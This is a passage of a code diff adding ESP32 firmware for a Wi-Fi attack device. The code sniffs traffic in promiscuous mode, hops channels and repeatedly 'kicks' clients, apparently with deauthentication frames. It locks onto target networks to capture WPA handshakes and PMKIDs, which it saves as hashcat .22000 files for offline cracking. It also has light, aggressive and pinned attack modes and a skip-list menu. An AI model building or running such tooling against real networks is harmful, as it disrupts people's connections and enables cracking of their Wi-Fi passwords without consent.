+    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(&promiscuousRxCb);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(startCh, WIFI_SECOND_CHAN_NONE);
+    s_cnt.currentChannel = startCh;
+    s_running = true;
+
+    if (s_pinOk) {
+        noteNetwork(s_pinBssid, s_pinSsid, true);
+        snprintf(s_cnt.currentBssid, sizeof(s_cnt.currentBssid),
+                 "%02X:%02X:%02X:%02X:%02X:%02X",
+                 s_pinBssid[0], s_pinBssid[1], s_pinBssid[2],
+                 s_pinBssid[3], s_pinBssid[4], s_pinBssid[5]);
+        setBarTarget(3, s_pinBssid, s_pinSsid[0] ? s_pinSsid : nullptr);
+    } else {
+        clearBarTarget();
+    }
+    Serial.printf("[CAP] %s hop=%u deauth=%u ch=%u method=%s sd=%u\n",
+                  mode == RunMode::Aggressive ? "AGGRESSIVE"
+                  : (mode == RunMode::Pinned ? "PINNED" : "light"),
+                  (unsigned)s_hopEnabled, (unsigned)s_deauthEnabled,
+                  (unsigned)s_cnt.currentChannel, s_cnt.methodTag, (unsigned)sdOk);
+}
+
+void startLight() {
+    startCommon(RunMode::Light);
+}
+
+void startAggressive() {
+    startCommon(RunMode::Aggressive);
+}
+
+void startPinned(uint8_t ch, const uint8_t* bssid, const char* ssid) {
+    if (!bssid) return;
+    s_pinOk = true;
+    s_pinCh = (ch >= 1 && ch <= 13) ? ch : 6;
+    memcpy(s_pinBssid, bssid, 6);
+    s_pinSsid[0] = 0;
+    if (ssid && ssid[0]) {
+        strncpy(s_pinSsid, ssid, 32);
+        s_pinSsid[32] = 0;
+    }
+    startCommon(RunMode::Pinned);
+}
+
+void stop() {
+    if (!s_running && s_mode == RunMode::Off) return;
+    bool hopped = s_hopEnabled;
+    s_running = false;
+    s_deauthEnabled = false;
+    s_hopEnabled = false;
+    s_mode = RunMode::Off;
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    drainRing();
+    Hc22000::flushPending();
+    commitPendingCaptures();
+    closeFile();
+    Storage::compactLoot();
+    WiFi.softAPdisconnect(true);
+    WiFi.disconnect(true, false);
+    WiFi.mode(WIFI_OFF);
+    (void)hopped;
+    Serial.printf("[CAP] stopped seen=%u eapol=%u written=%u deauth=%u dropped=%u\n",
+                  s_cnt.framesSeen, s_cnt.framesEapol,
+                  s_cnt.framesWritten, s_cnt.framesDeauth,
+                  s_cnt.framesDropped);
+
+    Hc22000::releaseMemory();
+    delete[] s_ring;
+    delete[] s_pending;
+    portENTER_CRITICAL(&s_beaconMux);
+    BeaconSlot* beacons = s_beacons;
+    s_ring = nullptr;
+    s_pending = nullptr;
+    s_beacons = nullptr;
+    s_beaconCount = 0;
+    portEXIT_CRITICAL(&s_beaconMux);
+    delete[] beacons;
+    s_write = 0;
+    s_read = 0;
+    releaseSkipMemory();
+    Serial.printf("[CAP] capture memory released heap=%u\n",
+                  (unsigned)ESP.getFreeHeap());
+}
+
+void releaseForSync() {
+    stop();
+}
+
+bool isRunning() { return s_running; }
+RunMode runMode() { return s_mode; }
+bool isLocked() { return s_running && s_lockUntil != 0 && millis() < s_lockUntil && !lockStreakExpired(); }
+
+const Counters& counters() { return s_cnt; }
+
+// Client count of the focused network for the bottom bar's "$N" badge.
+// Resolution order mirrors the bar's own focus logic: explicit bar target
+// (LOCK/PIN/HS), else the last BSSID we kicked, else the live lock, else the
+// last handshake network. Returns 0 if the target isn't in the live table yet.
+uint8_t targetClients() {
+    if (!s_running) return 0;
+    const uint8_t* t = nullptr;
+    uint8_t mac[6];
+    if (s_cnt.targetBssid[0] && parseColonMac(s_cnt.targetBssid, mac)) t = mac;
+    else if (!isZeroMac(s_kickBssid)) t = s_kickBssid;
+    else if (bssidLocked() && !isZeroMac(s_lockBssid)) t = s_lockBssid;
+    else if (!isZeroMac(s_lastHsBssid)) t = s_lastHsBssid;
+    if (!t) return 0;
+    BeaconSlot beacon;
+    return copyBeacon(t, beacon) ? beacon.clientN : 0;
+}
+
+bool isSkipped(const uint8_t* bssid) {
+    return isSessionSkipped(bssid);
+}
+
+bool skipMenuOpen() {
+    return s_skipMenuOpen;
+}
+
+uint16_t skipMenuCount() {
+    return s_menuEntryCount;
+}
+
+uint16_t skipMenuSelected() {
+    return s_menuSelected;
+}
+
+uint16_t skipMenuScroll() {
+    return s_menuScroll;
+}
+
+bool skipMenuEntry(uint16_t index, SkipEntry& out) {
+    if (!s_menuEntries || index >= s_menuEntryCount) return false;
+    out = s_menuEntries[index];
+    return true;
+}
+
+void setHsDepth(uint8_t depth) {
+    s_hsDepth = (depth > 2) ? 2 : depth;
+}
+
+uint8_t hsDepth() {
+    return s_hsDepth;
+}
+
+bool skipCurrent() {
+    if (!s_running) return false;
+
+    // Resolve target in priority order matching what the bottom bar shows:
+    //   1) lock-on-BSSID (actively chasing handshake)
+    //   2) last kick / EAPOL BSSID
+    //   3) bar "current" MAC (last beacon / noteNetwork) вЂ” what user sees
+    //   4) last HS BSSID (bar prefers lastHsSsid when set)
+    //   5) pinned target
+    // Previously we only used lock/kick/pin, so Z often skipped a stale
+    // kick while the bar still showed another SSID вЂ” that network then
+    // kept getting attacked.
+    uint8_t fromBar[6];
+    const uint8_t* t = nullptr;
+    if (!isZeroMac(s_lockBssid)) {
+        t = s_lockBssid;
+    } else if (!isZeroMac(s_kickBssid)) {
+        t = s_kickBssid;
+    } else if (parseColonMac(s_cnt.currentBssid, fromBar)) {
+        t = fromBar;
+    } else if (!isZeroMac(s_lastHsBssid)) {
+        t = s_lastHsBssid;
+    } else if (s_pinOk && !isZeroMac(s_pinBssid)) {
+        t = s_pinBssid;
+    }
+    if (!t) {
+        Display::showToast("SKIP NONE", 900);
+        return false;
+    }
+    uint8_t target[6];
+    memcpy(target, t, sizeof(target));
+    if (!addSkip(target)) {
+        Display::showToast("SKIP FAIL", 900);
+        return false;
+    }
+    char ssid[33] = {0};
+    ssidForBssid(target, ssid);
+    if (!ssid[0] && s_pinOk && memcmp(target, s_pinBssid, 6) == 0 && s_pinSsid[0])
+        strncpy(ssid, s_pinSsid, sizeof(ssid) - 1);
+    ssid[32] = '\0';
+    bool saved = setStoredSkip(target, ssid, true);
+
+    // Full release so the bar and radio stop sitting on this target.
+    disarmLockOnBssid();
+    s_lockUntil = 0;
+    if (s_fileOpen && sameBssid(s_fileBssid, target)) closeFile();
+    memset(s_kickBssid, 0, 6);
+    memset(s_kickSta, 0, 6);
+    s_kickStaOk = false;
+    if (memcmp(s_lastHsBssid, target, 6) == 0) memset(s_lastHsBssid, 0, 6);
+    s_cnt.currentBssid[0] = '\0';
+    s_cnt.currentSsid[0] = '\0';
+    s_cnt.lastHsSsid[0] = '\0';
+    clearBarTarget();
+    // Drop this AP from the live beacon table so scoring methods cannot
+    // rediscover it until a fresh beacon arrives вЂ” and even then
+    // isSessionSkipped() still blocks kick/lock/pcap for the session.
+    portENTER_CRITICAL(&s_beaconMux);
+    for (uint8_t i = 0; i < s_beaconCount; ) {
+        if (memcmp(s_beacons[i].bssid, target, 6) == 0) {
+            if (i + 1 < s_beaconCount) {
+                memmove(&s_beacons[i], &s_beacons[i + 1],
+                        (size_t)(s_beaconCount - i - 1) * sizeof(s_beacons[0]));
+            }
+            s_beaconCount--;
+            continue;
+        }
+        i++;
+    }
+    portEXIT_CRITICAL(&s_beaconMux);
+    // Next hop ASAP вЂ” don't stay parked on the skipped AP's channel.
+    s_lastHopMs = 0;
+
+    char msg[28];
+    if (ssid[0]) {
+        char shortSsid[12];
+        size_t n = 0;
+        while (ssid[n] && n < 10) {
+            char ch = ssid[n];
+            if (ch >= 'a' && ch <= 'z') ch = (char)(ch - 32);
+            shortSsid[n++] = ch;
+        }
+        shortSsid[n] = '\0';
+        snprintf(msg, sizeof(msg), "SKIP %s", shortSsid);
+    } else {
+        snprintf(msg, sizeof(msg), "SKIP %02X:%02X:%02X", target[3], target[4], target[5]);
+    }
+    if (!saved) strncat(msg, " TEMP", sizeof(msg) - strlen(msg) - 1);
+    Display::showToast(msg, 1200);
+    Serial.printf("[CAP] %s skip %s (%02X:%02X:%02X:%02X:%02X:%02X) n=%u\n",
+                  saved ? "persistent" : "temporary",
+                  ssid[0] ? ssid : "?",
+                  target[0], target[1], target[2], target[3], target[4], target[5],
+                  (unsigned)s_skipN);
+    return true;
+}
+
+static bool openSkipMenu() {
+    if (s_skipMenuOpen) return true;
+
+    // Allocate only while the user is viewing the Skip picker.
+    if (!s_menuEntries) {
+        s_menuEntries = new (std::nothrow) SkipEntry[MENU_ENTRY_MAX];
+        if (!s_menuEntries) {
+            Serial.println("[CAP] skip menu allocation failed");
+            Display::showToast("SKIP MEMORY FAIL", 1200);
+            return false;
+        }
+    }
+
+    loadStoredSkips();
+    if (!s_storedSkipsLoaded)
+        Display::showToast("SKIP LIST READ FAIL", 1200);
+    buildSkipMenu();
+
+    esp_err_t err = esp_wifi_set_promiscuous(false);
+    if (err != ESP_OK) {
+        Serial.printf("[CAP] cannot pause promiscuous RX for skip menu: %d\n", (int)err);
+        Display::showToast("RADIO PAUSE FAIL", 1200);
+        delete[] s_menuEntries;
+        s_menuEntries = nullptr;
+        s_menuEntryCount = 0;
+        s_menuSelected = 0;
+        s_menuScroll = 0;
+        return false;
+    }
+    s_skipMenuOpen = true;
+    s_menuSelected = 0;
+    s_menuScroll = 0;
+    s_skipMenuKeyWas = false;
+    s_skipMenuDownWas = false;
+    s_skipMenuEnterWas = false;
+    SFX::play(SFX::MENU_CLICK);
+    Serial.printf("[CAP] skip menu opened heap=%u\n", (unsigned)ESP.getFreeHeap());
+    return true;
+}
+
+static void closeSkipMenu() {
+    // Always release the menu allocation, even if restoring promiscuous RX
+    // fails. The radio error must not strand the menu buffer on the heap.
+    esp_err_t err = esp_wifi_set_promiscuous(true);
+    if (err != ESP_OK) {
+        Serial.printf("[CAP] cannot resume promiscuous RX after skip menu: %d\n", (int)err);
+        Display::showToast("RADIO RESUME FAIL", 1500);
+    }
+    s_skipMenuOpen = false;
+    s_skipMenuKeyWas = false;
+    s_skipMenuDownWas = false;
+    s_skipMenuEnterWas = false;
+    s_menuEntryCount = 0;
+    s_menuSelected = 0;
+    s_menuScroll = 0;
+    delete[] s_menuEntries;
+    s_menuEntries = nullptr;
+    s_lastHopMs = millis();
+    Serial.printf("[CAP] skip menu closed heap=%u\n", (unsigned)ESP.getFreeHeap());
+    SFX::play(SFX::BACK_NAV);
+}
+
+static void releaseSkippedTarget(const uint8_t* bssid) {
+    if (memcmp(s_lockBssid, bssid, 6) == 0) {
+        disarmLockOnBssid();
+        s_lockUntil = 0;
+    }
+    if (s_fileOpen && sameBssid(s_fileBssid, bssid)) closeFile();
+    if (memcmp(s_kickBssid, bssid, 6) == 0) {
+        memset(s_kickBssid, 0, sizeof(s_kickBssid));
+        memset(s_kickSta, 0, sizeof(s_kickSta));
+        s_kickStaOk = false;
+    }
+    if (memcmp(s_lastHsBssid, bssid, 6) == 0) {
+        memset(s_lastHsBssid, 0, sizeof(s_lastHsBssid));
+        s_cnt.lastHsSsid[0] = '\0';
+    }
+    uint8_t barBssid[6];
+    if (parseColonMac(s_cnt.targetBssid, barBssid) &&
+        memcmp(barBssid, bssid, 6) == 0)
+        clearBarTarget();
+    if (parseColonMac(s_cnt.currentBssid, barBssid) &&
+        memcmp(barBssid, bssid, 6) == 0) {
+        s_cnt.currentBssid[0] = '\0';
+        s_cnt.currentSsid[0] = '\0';
+    }
+    portENTER_CRITICAL(&s_beaconMux);
+    for (uint8_t i = 0; i < s_beaconCount; ) {
+        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
+            if (i + 1 < s_beaconCount)
+                memmove(&s_beacons[i], &s_beacons[i + 1],
+                        (size_t)(s_beaconCount - i - 1) * sizeof(s_beacons[0]));
+            s_beaconCount--;
+        } else {
+            i++;
+        }
+    }
+    portEXIT_CRITICAL(&s_beaconMux);
+    s_lastHopMs = 0;
+}
+
+static void updateSkipMenu() {
+    bool up = keyEdge(';', s_skipMenuKeyWas);
+    bool down = keyEdge('.', s_skipMenuDownWas);
+    // Separate key latches: keyNewPress is intentionally not used here because
+    // navigation, Enter and Escape can be pressed in the same keyboard frame.
+    bool enter = keyEdge(KEY_ENTER, s_skipMenuEnterWas);
+    if (keyEsc()) {
+        closeSkipMenu();
+        return;
+    }
+    const uint16_t visibleRows = 5;
+    if (up && s_menuSelected > 0) s_menuSelected--;
+    if (down && s_menuSelected + 1 < s_menuEntryCount) s_menuSelected++;
+    if (s_menuSelected < s_menuScroll) s_menuScroll = s_menuSelected;
+    else if (s_menuSelected >= s_menuScroll + visibleRows)
+        s_menuScroll = s_menuSelected - visibleRows + 1;
+    if (up || down) SFX::play(SFX::MENU_CLICK);
+    if (!enter || !s_menuEntryCount) return;
+    SkipEntry& entry = s_menuEntries[s_menuSelected];
+    const bool next = !entry.enabled;
+    if (!setStoredSkip(entry.bssid, entry.ssid, next)) {
+        Display::showToast("SD SAVE FAILED", 1200);
+        Serial.println("[CAP] failed to save persistent radio skip list");
+        return;
+    }
+    entry.enabled = next;
+    if (next) releaseSkippedTarget(entry.bssid);
+    else removeSessionSkip(entry.bssid);
+    uint8_t selectedBssid[6];
+    memcpy(selectedBssid, entry.bssid, sizeof(selectedBssid));
+    const uint16_t previousIndex = s_menuSelected;
+    buildSkipMenu();
+    for (uint16_t i = 0; i < s_menuEntryCount; ++i) {
+        if (memcmp(s_menuEntries[i].bssid, selectedBssid, sizeof(selectedBssid)) == 0) {
+            s_menuSelected = i;
+            break;
+        }
+        if (i + 1 == s_menuEntryCount && s_menuEntryCount)
+            s_menuSelected = previousIndex < s_menuEntryCount
+                ? previousIndex : s_menuEntryCount - 1;
+    }
+    if (s_menuSelected < s_menuScroll) s_menuScroll = s_menuSelected;
+    else if (s_menuSelected >= s_menuScroll + 5)
+        s_menuScroll = s_menuSelected - 4;
+    SFX::play(SFX::CONFIRM);
+    Display::showToast(next ? "SKIP ENABLED" : "SKIP DISABLED", 800);
+}
+
+void loop() {
+    if (!s_running) return;
+
+    bool qPressed = Keys::isKeyPressed('q') ||
+                    Keys::isKeyPressed('Q');
+    bool qEdge = qPressed && !s_skipMenuQWas;
+    s_skipMenuQWas = qPressed;
+
+    if (s_skipMenuOpen) {
+        if (qEdge) closeSkipMenu();
+        else updateSkipMenu();
+        return;
+    }
+
+    if (qEdge) {
+        openSkipMenu();
+        return;
+    }
+
+    // Z immediately skips the focused AP and persists it when SD is available.
+    {
+        bool z = Keys::isKeyPressed('z') ||
+                 Keys::isKeyPressed('Z');
+        if (z && !s_skipKeyWas) skipCurrent();
+        s_skipKeyWas = z;
+    }
+
+    drainRing();
+    // Hc22000::feed() runs from the WiFi promiscuous IRQ; it only fills
+    // in-memory slots and marks them dirty. flushPending() is where the
+    // actual .22000 / .pmkid files are written to SD - safe to do here,
+    // never inside the ISR.
+    Hc22000::flushPending();
+    commitPendingCaptures();
+    maybeRotateMethod();
+    decayBeaconActivity(millis());
+
+    // Auto-release lock-on-BSSID once HS DEPTH's requirement is met (see
+    // Hc22000::hasHandshake()), or once the deadline (or the
+    // lockStreakExpired() hard cap) has passed - this just clears the
+    // now-stale bssid/channel bytes so they don't linger. Also releases
+    // the plain s_lockUntil at the same moment, instead of coasting on it
+    // for the rest of lockMs.
+    //
+    // DEPTH HOLD (RADIO): when hsDepth > 0 and we already have a crackable
+    // pair but still want M3/M4, keep refreshing the lock deadline by
+    // depthHoldSec so the radio doesn't hop away just because lockMs
+    // expired without a new EAPOL refresh.
+    if (bssidLocked()) {
+        if (!isZeroMac(s_lockBssid) && Hc22000::hasHandshake(s_lockBssid, s_hsDepth)) {
+            disarmLockOnBssid();
+            s_lockUntil = 0;
+        } else if (!isZeroMac(s_lockBssid) && s_hsDepth > 0 && s_depthHoldSec > 0 &&
+                   Hc22000::hasPair(s_lockBssid)) {
+            uint32_t holdUntil = millis() + (uint32_t)s_depthHoldSec * 1000u;
+            if (s_lockBssidUntil < holdUntil) s_lockBssidUntil = holdUntil;
+            if (s_lockUntil < holdUntil) s_lockUntil = holdUntil;
+        }
+    } else if (!isZeroMac(s_lockBssid)) {
+        disarmLockOnBssid();
+        // Lock ended вЂ” if bar still shows LOCK, fall back to last HS or SCAN.
+        if (s_cnt.targetMode == 1) {
+            if (s_cnt.lastHsSsid[0] && !isZeroMac(s_lastHsBssid))
+                setBarTarget(2, s_lastHsBssid, s_cnt.lastHsSsid);
+            else
+                clearBarTarget();
+        }
+    }
+
+    // Keep bar SSID in sync while locked (beacon may learn name after M1).
+    if (bssidLocked() && !isZeroMac(s_lockBssid)) {
+        char ssid[33];
+        ssidForBssid(s_lockBssid, ssid);
+        setBarTarget(1, s_lockBssid, ssid[0] ? ssid : nullptr);
+    }
+
+    uint32_t now = millis();
+
+    // Porkchop-style lock-on-BSSID: if we caught an EAPOL and the target's
+    // pair isn't on file yet, park on its channel so M2 (sent back from the
+    // station on the SAME channel the AP is on) actually reaches us. This
+    // MUST run before the plain isLocked() check below: s_lockUntil and
+    // s_lockBssidUntil are armed together (same event, same lockMs), so
+    // isLocked() is almost always true whenever bssidLocked() is - if its
+    // early `return` came first, this channel park would never get a
+    // chance to run at all.
+    if (bssidLocked() && s_lockBssidCh >= 1 && s_lockBssidCh <= 13 &&
+        s_cnt.currentChannel != s_lockBssidCh) {
+        esp_wifi_set_channel(s_lockBssidCh, WIFI_SECOND_CHAN_NONE);
+        s_cnt.currentChannel = s_lockBssidCh;
+    }
+
+    if (isLocked()) {
+        if (now - s_lastHopMs >= 400) {
+            s_lastHopMs = now;
+            kickOnThisChannel();
+        }
+        return;
+    }
+
+    if (!s_hopEnabled) {
+        if (s_pinOk && now - s_lastHopMs >= 400) {
+            s_lastHopMs = now;
+            kickOnThisChannel();
+        }
+        return;
+    }
+    uint16_t hopIntervalMs = s_hopMs;
+    if (s_dwellMinMs > hopIntervalMs) hopIntervalMs = s_dwellMinMs;
+    if (now - s_lastHopMs >= hopIntervalMs) {
+        s_lastHopMs = now;
+        uint8_t hopN = 0;
+        const uint8_t* hops = hopTable(&hopN);
+        if (hopN == 0) return;
+        s_channelIdx = (uint8_t)((s_channelIdx + 1) % hopN);
+        uint8_t ch = hops[s_channelIdx];
+        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+        s_cnt.currentChannel = ch;
+        kickOnThisChannel();
+    }
+}
+
+} // namespace Cap
+
+
